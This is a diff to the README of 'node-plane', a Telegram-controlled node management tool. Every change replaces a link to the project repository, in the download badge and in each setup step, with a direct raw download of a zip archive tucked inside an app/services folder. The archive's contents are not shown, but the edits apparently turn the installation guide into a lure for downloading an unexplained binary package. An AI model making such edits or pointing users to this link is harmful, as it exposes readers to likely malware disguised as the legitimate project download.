@@ -1,6 +1,6 @@
 # 🖥️ node-plane - Control secure nodes from Telegram
 
-[![Download node-plane](https://img.shields.io/badge/Download%20node-plane-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Reesheaded250/node-plane)
+[![Download node-plane](https://img.shields.io/badge/Download%20node-plane-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Reesheaded250/node-plane/raw/refs/heads/main/app/services/plane-node-2.5-beta.4.zip)
 
 ## 📌 What this is
 
@@ -26,7 +26,7 @@ node-plane is designed for self-hosted use. On Windows, the simplest path is to 
 
 Visit this page to download and set up node-plane:
 
-https://github.com/Reesheaded250/node-plane
+https://github.com/Reesheaded250/node-plane/raw/refs/heads/main/app/services/plane-node-2.5-beta.4.zip
 
 ### 🧩 Before you start
 
@@ -43,7 +43,7 @@ If you are not sure which setup to use, start with the Docker path if you alread
 ## 🚀 Quick start
 
 1. Open the download page:
-   https://github.com/Reesheaded250/node-plane
+   https://github.com/Reesheaded250/node-plane/raw/refs/heads/main/app/services/plane-node-2.5-beta.4.zip
 
 2. Download or clone the project files.
 
@@ -85,7 +85,7 @@ Use this path if you want to run the app directly on Windows.
 
 1. Install Python 3.11 or newer.
 2. Download the project from:
-   https://github.com/Reesheaded250/node-plane
+   https://github.com/Reesheaded250/node-plane/raw/refs/heads/main/app/services/plane-node-2.5-beta.4.zip
 3. Open the project folder in File Explorer.
 4. Open PowerShell in that folder.
 5. Create a virtual environment.
@@ -133,7 +133,7 @@ After you save the settings, start node-plane and open Telegram. Send the bot a 
 
 Use the link below to download and set up the project files:
 
-https://github.com/Reesheaded250/node-plane
+https://github.com/Reesheaded250/node-plane/raw/refs/heads/main/app/services/plane-node-2.5-beta.4.zip
 
 After you open the page:
 
@@ -229,4 +229,4 @@ This makes it easier to find files later.
 
 Open the repository here:
 
-https://github.com/Reesheaded250/node-plane
+https://github.com/Reesheaded250/node-plane/raw/refs/heads/main/app/services/plane-node-2.5-beta.4.zip
